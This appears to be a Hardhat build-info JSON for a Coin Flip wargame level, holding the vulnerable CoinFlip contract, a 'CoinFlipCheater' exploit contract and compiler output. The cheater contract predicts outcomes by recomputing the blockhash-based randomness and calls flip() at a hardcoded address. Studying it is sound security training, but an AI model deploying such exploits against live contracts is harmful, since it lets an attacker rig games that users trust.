{
	"id": "b2eafaab6584dbc1bb42824bac89cb0f",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.0",
	"solcLongVersion": "0.8.0+commit.c7dfd78e",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/CoinFlipCheater.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"./CoinFlip.sol\";\n\ncontract CoinFlipCheater {\n    constructor() {}\n\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    address coinFlipAddress = 0x33C7Af9d0E10FB4D230D317376C87caB80C276Ec;\n\n    function cheat() public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlip = blockValue / FACTOR;\n\n        bool side = coinFlip == 1 ? true : false;\n\n        CoinFlip cf = CoinFlip(coinFlipAddress);\n        return cf.flip(side);\n    }\n}"
			},
			"contracts/CoinFlip.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n\n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/CoinFlip.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "consecutiveWins",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/CoinFlip.sol\":57:712  contract CoinFlip {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/CoinFlip.sol\":151:228  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/CoinFlip.sol\":134:228  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"contracts/CoinFlip.sol\":233:277  constructor() {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contracts/CoinFlip.sol\":271:272  0 */\n  0x00\n    /* \"contracts/CoinFlip.sol\":253:268  consecutiveWins */\n  dup1\n    /* \"contracts/CoinFlip.sol\":253:272  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contracts/CoinFlip.sol\":57:712  contract CoinFlip {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/CoinFlip.sol\":57:712  contract CoinFlip {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/CoinFlip.sol\":281:710  function flip(bool _guess) public returns (bool) {... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/CoinFlip.sol\":80:110  uint256 public consecutiveWins */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/CoinFlip.sol\":281:710  function flip(bool _guess) public returns (bool) {... */\n    tag_8:\n        /* \"contracts/CoinFlip.sol\":324:328  bool */\n      0x00\n        /* \"contracts/CoinFlip.sol\":336:354  uint256 blockValue */\n      dup1\n        /* \"contracts/CoinFlip.sol\":390:391  1 */\n      0x01\n        /* \"contracts/CoinFlip.sol\":375:387  block.number */\n      number\n        /* \"contracts/CoinFlip.sol\":375:391  block.number - 1 */\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n        /* \"contracts/CoinFlip.sol\":365:392  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/CoinFlip.sol\":357:393  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/CoinFlip.sol\":336:393  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":416:426  blockValue */\n      dup1\n        /* \"contracts/CoinFlip.sol\":404:412  lastHash */\n      sload(0x01)\n        /* \"contracts/CoinFlip.sol\":404:426  lastHash == blockValue */\n      eq\n        /* \"contracts/CoinFlip.sol\":400:451  if (lastHash == blockValue) {... */\n      iszero\n      tag_18\n      jumpi\n        /* \"contracts/CoinFlip.sol\":436:444  revert() */\n      0x00\n      dup1\n      revert\n        /* \"contracts/CoinFlip.sol\":400:451  if (lastHash == blockValue) {... */\n    tag_18:\n        /* \"contracts/CoinFlip.sol\":468:478  blockValue */\n      dup1\n        /* \"contracts/CoinFlip.sol\":457:465  lastHash */\n      0x01\n        /* \"contracts/CoinFlip.sol\":457:478  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/CoinFlip.sol\":484:500  uint256 coinFlip */\n      0x00\n        /* \"contracts/CoinFlip.sol\":516:522  FACTOR */\n      sload(0x02)\n        /* \"contracts/CoinFlip.sol\":503:513  blockValue */\n      dup3\n        /* \"contracts/CoinFlip.sol\":503:522  blockValue / FACTOR */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"contracts/CoinFlip.sol\":484:522  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":528:537  bool side */\n      0x00\n        /* \"contracts/CoinFlip.sol\":552:553  1 */\n      0x01\n        /* \"contracts/CoinFlip.sol\":540:548  coinFlip */\n      dup3\n        /* \"contracts/CoinFlip.sol\":540:553  coinFlip == 1 */\n      eq\n        /* \"contracts/CoinFlip.sol\":540:568  coinFlip == 1 ? true : false */\n      tag_21\n      jumpi\n        /* \"contracts/CoinFlip.sol\":563:568  false */\n      0x00\n        /* \"contracts/CoinFlip.sol\":540:568  coinFlip == 1 ? true : false */\n      jump(tag_22)\n    tag_21:\n        /* \"contracts/CoinFlip.sol\":556:560  true */\n      0x01\n        /* \"contracts/CoinFlip.sol\":540:568  coinFlip == 1 ? true : false */\n    tag_22:\n        /* \"contracts/CoinFlip.sol\":528:568  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":587:593  _guess */\n      dup5\n        /* \"contracts/CoinFlip.sol\":579:593  side == _guess */\n      iszero\n      iszero\n        /* \"contracts/CoinFlip.sol\":579:583  side */\n      dup2\n        /* \"contracts/CoinFlip.sol\":579:593  side == _guess */\n      iszero\n      iszero\n      eq\n        /* \"contracts/CoinFlip.sol\":575:706  if (side == _guess) {... */\n      iszero\n      tag_23\n      jumpi\n        /* \"contracts/CoinFlip.sol\":603:618  consecutiveWins */\n      0x00\n      dup1\n        /* \"contracts/CoinFlip.sol\":603:620  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_24\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contracts/CoinFlip.sol\":635:639  true */\n      0x01\n        /* \"contracts/CoinFlip.sol\":628:639  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_15)\n        /* \"contracts/CoinFlip.sol\":575:706  if (side == _guess) {... */\n    tag_23:\n        /* \"contracts/CoinFlip.sol\":678:679  0 */\n      0x00\n        /* \"contracts/CoinFlip.sol\":660:675  consecutiveWins */\n      dup1\n        /* \"contracts/CoinFlip.sol\":660:679  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/CoinFlip.sol\":694:699  false */\n      0x00\n        /* \"contracts/CoinFlip.sol\":687:699  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/CoinFlip.sol\":281:710  function flip(bool _guess) public returns (bool) {... */\n    tag_15:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/CoinFlip.sol\":80:110  uint256 public consecutiveWins */\n    tag_12:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:140   */\n    tag_28:\n      0x00\n        /* \"#utility.yul\":88:94   */\n      dup2\n        /* \"#utility.yul\":75:95   */\n      calldataload\n        /* \"#utility.yul\":66:95   */\n      swap1\n      pop\n        /* \"#utility.yul\":104:134   */\n      tag_30\n        /* \"#utility.yul\":128:133   */\n      dup2\n        /* \"#utility.yul\":104:134   */\n      tag_31\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":56:140   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":146:402   */\n    tag_7:\n      0x00\n        /* \"#utility.yul\":251:253   */\n      0x20\n        /* \"#utility.yul\":239:248   */\n      dup3\n        /* \"#utility.yul\":230:237   */\n      dup5\n        /* \"#utility.yul\":226:249   */\n      sub\n        /* \"#utility.yul\":222:254   */\n      slt\n        /* \"#utility.yul\":219:221   */\n      iszero\n      tag_33\n      jumpi\n        /* \"#utility.yul\":267:268   */\n      0x00\n        /* \"#utility.yul\":264:265   */\n      dup1\n        /* \"#utility.yul\":257:269   */\n      revert\n        /* \"#utility.yul\":219:221   */\n    tag_33:\n        /* \"#utility.yul\":310:311   */\n      0x00\n        /* \"#utility.yul\":335:385   */\n      tag_34\n        /* \"#utility.yul\":377:384   */\n      dup5\n        /* \"#utility.yul\":368:374   */\n      dup3\n        /* \"#utility.yul\":357:366   */\n      dup6\n        /* \"#utility.yul\":353:375   */\n      add\n        /* \"#utility.yul\":335:385   */\n      tag_28\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":325:385   */\n      swap2\n      pop\n        /* \"#utility.yul\":281:395   */\n      pop\n        /* \"#utility.yul\":209:402   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":408:517   */\n    tag_35:\n        /* \"#utility.yul\":489:510   */\n      tag_37\n        /* \"#utility.yul\":504:509   */\n      dup2\n        /* \"#utility.yul\":489:510   */\n      tag_38\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":484:487   */\n      dup3\n        /* \"#utility.yul\":477:511   */\n      mstore\n        /* \"#utility.yul\":467:517   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":523:641   */\n    tag_39:\n        /* \"#utility.yul\":610:634   */\n      tag_41\n        /* \"#utility.yul\":628:633   */\n      dup2\n        /* \"#utility.yul\":610:634   */\n      tag_42\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":605:608   */\n      dup3\n        /* \"#utility.yul\":598:635   */\n      mstore\n        /* \"#utility.yul\":588:641   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":647:857   */\n    tag_10:\n      0x00\n        /* \"#utility.yul\":772:774   */\n      0x20\n        /* \"#utility.yul\":761:770   */\n      dup3\n        /* \"#utility.yul\":757:775   */\n      add\n        /* \"#utility.yul\":749:775   */\n      swap1\n      pop\n        /* \"#utility.yul\":785:850   */\n      tag_44\n        /* \"#utility.yul\":847:848   */\n      0x00\n        /* \"#utility.yul\":836:845   */\n      dup4\n        /* \"#utility.yul\":832:849   */\n      add\n        /* \"#utility.yul\":823:829   */\n      dup5\n        /* \"#utility.yul\":785:850   */\n      tag_35\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":739:857   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":863:1085   */\n    tag_14:\n      0x00\n        /* \"#utility.yul\":994:996   */\n      0x20\n        /* \"#utility.yul\":983:992   */\n      dup3\n        /* \"#utility.yul\":979:997   */\n      add\n        /* \"#utility.yul\":971:997   */\n      swap1\n      pop\n        /* \"#utility.yul\":1007:1078   */\n      tag_46\n        /* \"#utility.yul\":1075:1076   */\n      0x00\n        /* \"#utility.yul\":1064:1073   */\n      dup4\n        /* \"#utility.yul\":1060:1077   */\n      add\n        /* \"#utility.yul\":1051:1057   */\n      dup5\n        /* \"#utility.yul\":1007:1078   */\n      tag_39\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":961:1085   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1091:1276   */\n    tag_20:\n      0x00\n        /* \"#utility.yul\":1148:1168   */\n      tag_48\n        /* \"#utility.yul\":1166:1167   */\n      dup3\n        /* \"#utility.yul\":1148:1168   */\n      tag_42\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":1143:1168   */\n      swap2\n      pop\n        /* \"#utility.yul\":1182:1202   */\n      tag_49\n        /* \"#utility.yul\":1200:1201   */\n      dup4\n        /* \"#utility.yul\":1182:1202   */\n      tag_42\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":1177:1202   */\n      swap3\n      pop\n        /* \"#utility.yul\":1221:1222   */\n      dup3\n        /* \"#utility.yul\":1211:1213   */\n      tag_50\n      jumpi\n        /* \"#utility.yul\":1226:1244   */\n      tag_51\n      tag_52\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1211:1213   */\n    tag_50:\n        /* \"#utility.yul\":1268:1269   */\n      dup3\n        /* \"#utility.yul\":1265:1266   */\n      dup3\n        /* \"#utility.yul\":1261:1270   */\n      div\n        /* \"#utility.yul\":1256:1270   */\n      swap1\n      pop\n        /* \"#utility.yul\":1133:1276   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1282:1473   */\n    tag_17:\n      0x00\n        /* \"#utility.yul\":1342:1362   */\n      tag_54\n        /* \"#utility.yul\":1360:1361   */\n      dup3\n        /* \"#utility.yul\":1342:1362   */\n      tag_42\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1337:1362   */\n      swap2\n      pop\n        /* \"#utility.yul\":1376:1396   */\n      tag_55\n        /* \"#utility.yul\":1394:1395   */\n      dup4\n        /* \"#utility.yul\":1376:1396   */\n      tag_42\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1371:1396   */\n      swap3\n      pop\n        /* \"#utility.yul\":1415:1416   */\n      dup3\n        /* \"#utility.yul\":1412:1413   */\n      dup3\n        /* \"#utility.yul\":1409:1417   */\n      lt\n        /* \"#utility.yul\":1406:1408   */\n      iszero\n      tag_56\n      jumpi\n        /* \"#utility.yul\":1420:1438   */\n      tag_57\n      tag_58\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":1406:1408   */\n    tag_56:\n        /* \"#utility.yul\":1465:1466   */\n      dup3\n        /* \"#utility.yul\":1462:1463   */\n      dup3\n        /* \"#utility.yul\":1458:1467   */\n      sub\n        /* \"#utility.yul\":1450:1467   */\n      swap1\n      pop\n        /* \"#utility.yul\":1327:1473   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1479:1569   */\n    tag_38:\n      0x00\n        /* \"#utility.yul\":1556:1561   */\n      dup2\n        /* \"#utility.yul\":1549:1562   */\n      iszero\n        /* \"#utility.yul\":1542:1563   */\n      iszero\n        /* \"#utility.yul\":1531:1563   */\n      swap1\n      pop\n        /* \"#utility.yul\":1521:1569   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1575:1652   */\n    tag_42:\n      0x00\n        /* \"#utility.yul\":1641:1646   */\n      dup2\n        /* \"#utility.yul\":1630:1646   */\n      swap1\n      pop\n        /* \"#utility.yul\":1620:1652   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1658:1891   */\n    tag_25:\n      0x00\n        /* \"#utility.yul\":1720:1744   */\n      tag_62\n        /* \"#utility.yul\":1738:1743   */\n      dup3\n        /* \"#utility.yul\":1720:1744   */\n      tag_42\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":1711:1744   */\n      swap2\n      pop\n        /* \"#utility.yul\":1766:1832   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1759:1764   */\n      dup3\n        /* \"#utility.yul\":1756:1833   */\n      eq\n        /* \"#utility.yul\":1753:1755   */\n      iszero\n      tag_63\n      jumpi\n        /* \"#utility.yul\":1836:1854   */\n      tag_64\n      tag_58\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1753:1755   */\n    tag_63:\n        /* \"#utility.yul\":1883:1884   */\n      0x01\n        /* \"#utility.yul\":1876:1881   */\n      dup3\n        /* \"#utility.yul\":1872:1885   */\n      add\n        /* \"#utility.yul\":1865:1885   */\n      swap1\n      pop\n        /* \"#utility.yul\":1701:1891   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1897:2077   */\n    tag_58:\n        /* \"#utility.yul\":1945:2022   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1942:1943   */\n      0x00\n        /* \"#utility.yul\":1935:2023   */\n      mstore\n        /* \"#utility.yul\":2042:2046   */\n      0x11\n        /* \"#utility.yul\":2039:2040   */\n      0x04\n        /* \"#utility.yul\":2032:2047   */\n      mstore\n        /* \"#utility.yul\":2066:2070   */\n      0x24\n        /* \"#utility.yul\":2063:2064   */\n      0x00\n        /* \"#utility.yul\":2056:2071   */\n      revert\n        /* \"#utility.yul\":2083:2263   */\n    tag_52:\n        /* \"#utility.yul\":2131:2208   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2128:2129   */\n      0x00\n        /* \"#utility.yul\":2121:2209   */\n      mstore\n        /* \"#utility.yul\":2228:2232   */\n      0x12\n        /* \"#utility.yul\":2225:2226   */\n      0x04\n        /* \"#utility.yul\":2218:2233   */\n      mstore\n        /* \"#utility.yul\":2252:2256   */\n      0x24\n        /* \"#utility.yul\":2249:2250   */\n      0x00\n        /* \"#utility.yul\":2242:2257   */\n      revert\n        /* \"#utility.yul\":2269:2385   */\n    tag_31:\n        /* \"#utility.yul\":2339:2360   */\n      tag_68\n        /* \"#utility.yul\":2354:2359   */\n      dup2\n        /* \"#utility.yul\":2339:2360   */\n      tag_38\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":2332:2337   */\n      dup2\n        /* \"#utility.yul\":2329:2361   */\n      eq\n        /* \"#utility.yul\":2319:2321   */\n      tag_69\n      jumpi\n        /* \"#utility.yul\":2375:2376   */\n      0x00\n        /* \"#utility.yul\":2372:2373   */\n      dup1\n        /* \"#utility.yul\":2365:2377   */\n      revert\n        /* \"#utility.yul\":2319:2321   */\n    tag_69:\n        /* \"#utility.yul\":2309:2385   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220923d838005b64d30aa2dad78940807fe3499a1db917e5328ef15042e95d6d3ad64736f6c63430008000033\n}\n",
						"bytecode": {
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b50600080819055506103278061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061013b565b610089565b6040516100629190610182565b60405180910390f35b610073610120565b604051610080919061019d565b60405180910390f35b60008060014361009991906101e9565b4060001c90508060015414156100ae57600080fd5b806001819055506000600254826100c591906101b8565b90506000600182146100d85760006100db565b60015b9050841515811515141561010c576000808154809291906100fb90610233565b91905055506001935050505061011b565b60008081905550600093505050505b919050565b60005481565b600081359050610135816102da565b92915050565b60006020828403121561014d57600080fd5b600061015b84828501610126565b91505092915050565b61016d8161021d565b82525050565b61017c81610229565b82525050565b60006020820190506101976000830184610164565b92915050565b60006020820190506101b26000830184610173565b92915050565b60006101c382610229565b91506101ce83610229565b9250826101de576101dd6102ab565b5b828204905092915050565b60006101f482610229565b91506101ff83610229565b9250828210156102125761021161027c565b5b828203905092915050565b60008115159050919050565b6000819050919050565b600061023e82610229565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156102715761027061027c565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6102e38161021d565b81146102ee57600080fd5b5056fea2646970667358221220923d838005b64d30aa2dad78940807fe3499a1db917e5328ef15042e95d6d3ad64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH2 0x327 DUP1 PUSH2 0x4B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x182 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x19D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x1E9 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xAE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xC5 SWAP2 SWAP1 PUSH2 0x1B8 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xD8 JUMPI PUSH1 0x0 PUSH2 0xDB JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x10C JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xFB SWAP1 PUSH2 0x233 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x135 DUP2 PUSH2 0x2DA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x14D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x15B DUP5 DUP3 DUP6 ADD PUSH2 0x126 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x16D DUP2 PUSH2 0x21D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x17C DUP2 PUSH2 0x229 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x197 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x164 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x173 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C3 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1CE DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1DE JUMPI PUSH2 0x1DD PUSH2 0x2AB JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F4 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1FF DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x212 JUMPI PUSH2 0x211 PUSH2 0x27C JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x23E DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x271 JUMPI PUSH2 0x270 PUSH2 0x27C JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x2E3 DUP2 PUSH2 0x21D JUMP JUMPDEST DUP2 EQ PUSH2 0x2EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP3 RETURNDATASIZE DUP4 DUP1 SDIV 0xB6 0x4D ADDRESS 0xAA 0x2D 0xAD PUSH25 0x940807FE3499A1DB917E5328EF15042E95D6D3AD64736F6C63 NUMBER STOP ADDMOD STOP STOP CALLER ",
							"sourceMap": "57:655:0:-:0;;;151:77;134:94;;233:44;;;;;;;;;;271:1;253:15;:19;;;;57:655;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2388:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "56:84:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "66:29:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "88:6:2"
																	}
																],
																"functionName": {
																	"name": "calldataload",
